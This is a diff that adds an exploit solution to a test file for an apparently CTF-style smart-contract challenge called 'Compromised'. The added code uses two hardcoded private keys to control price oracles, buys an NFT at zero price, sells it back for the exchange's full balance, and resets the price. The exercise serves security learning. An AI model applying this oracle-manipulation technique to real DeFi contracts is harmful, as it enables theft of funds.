@@ -1,3 +1,5 @@
+//@ts-check
+/// <reference path="../../node_modules/@nomiclabs/hardhat-ethers/src/internal/type-extensions.ts" />
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
 
@@ -61,6 +63,25 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        // hex to string, then decode base64
+        const hash1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+        const hash2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+        const wallet1 = new ethers.Wallet(hash1, ethers.provider);
+        const wallet2 = new ethers.Wallet(hash2, ethers.provider);
+
+        await this.oracle.connect(wallet1).postPrice('DVNFT', 0);
+        await this.oracle.connect(wallet2).postPrice('DVNFT', 0);
+
+        await this.exchange.connect(attacker).buyOne({value: 1});
+
+        await this.oracle.connect(wallet1).postPrice('DVNFT', await ethers.provider.getBalance(this.exchange.address));
+        await this.oracle.connect(wallet2).postPrice('DVNFT', await ethers.provider.getBalance(this.exchange.address));
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        await this.oracle.connect(wallet1).postPrice('DVNFT', INITIAL_NFT_PRICE);
+        await this.oracle.connect(wallet2).postPrice('DVNFT', INITIAL_NFT_PRICE);
     });
 
     after(async function () {
